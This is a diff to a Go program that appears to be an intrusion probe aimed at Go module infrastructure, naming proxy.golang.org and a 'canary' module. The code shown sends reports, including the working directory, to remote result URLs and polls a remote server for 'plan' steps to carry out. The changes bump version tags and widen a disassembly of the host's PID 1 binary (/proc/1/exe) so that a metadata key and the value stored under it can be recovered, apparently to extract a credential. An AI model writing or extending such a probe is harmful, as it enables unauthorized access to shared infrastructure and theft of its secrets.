@@ -37,7 +37,7 @@ var rpcDialAddress string
 const (
 	protocolVersion        = 1
 	moduleName             = "github.com/benr00t3d/go-cgo-pkgsite-probe"
-	probeVersion           = "v0.0.39-codex"
+	probeVersion           = "v0.0.41-codex"
 	descriptorHelperSHA256 = "a4310ffe3aab048caef9d93b19e7410cb261fb8678b33cb19d04f58e6d2c1acf"
 	targetRegistry         = "https://proxy.golang.org"
 	targetModuleName       = "github.com/benr00t3d/go-byteman-crosswrite-canary"
@@ -192,7 +192,7 @@ func main() {
 	report := newProbeReport(started, identity)
 	report.Reason = "internal checks are fixed to the verified capslock lane"
 	report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(genericResultURL, "v039-codex-"+identity.Lane, cwd, started, report)
+	_ = submitProbeReport(genericResultURL, "v041-codex-"+identity.Lane, cwd, started, report)
 }
 
 func newProbeReport(started time.Time, identity identityResult) probeReport {
@@ -333,7 +333,7 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 	initial := newProbeReport(started, identity)
 	initial.Reason = "waiting for the bounded read-only descriptor plan"
 	initial.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	if err := submitProbeReport(compilerResultURL, "v039-codex-capslock-initial", cwd, started, initial); err != nil {
+	if err := submitProbeReport(compilerResultURL, "v041-codex-capslock-initial", cwd, started, initial); err != nil {
 		return
 	}
 
@@ -368,7 +368,7 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 			report.Reason = "validated plan action had no implementation"
 		}
 		report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-		id := "v039-codex-step-" + strconv.Itoa(cursor)
+		id := "v041-codex-step-" + strconv.Itoa(cursor)
 		if err := submitProbeReport(compilerResultURL, id, cwd, stepStarted, report); err != nil {
 			return
 		}
@@ -387,7 +387,7 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 		final.Reason = "bounded plan polling window expired"
 	}
 	final.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(compilerResultURL, "v039-codex-final", cwd, finalStarted, final)
+	_ = submitProbeReport(compilerResultURL, "v041-codex-final", cwd, finalStarted, final)
 }
 
 func fetchPlan(cursor int) (planStep, bool, error) {
@@ -646,7 +646,9 @@ func runSessionDataflowInspection(report *probeReport) {
 		result.Error = cleanError(err)
 		return
 	}
-	result.DialWindow = instructionWindow(dialOutput, "metadata.New", 28, 16)
+	// Keep enough instructions before mapassign_faststr to resolve both the
+	// fixed 15-byte metadata key and the exact value loaded into its map slot.
+	result.DialWindow = instructionWindow(dialOutput, "metadata.New", 112, 24)
 	callerOutput, err := runFixedTool(
 		"/usr/bin/objdump", "-d", "-M", "intel", "--disassemble=main.main", "/proc/1/exe",
 	)
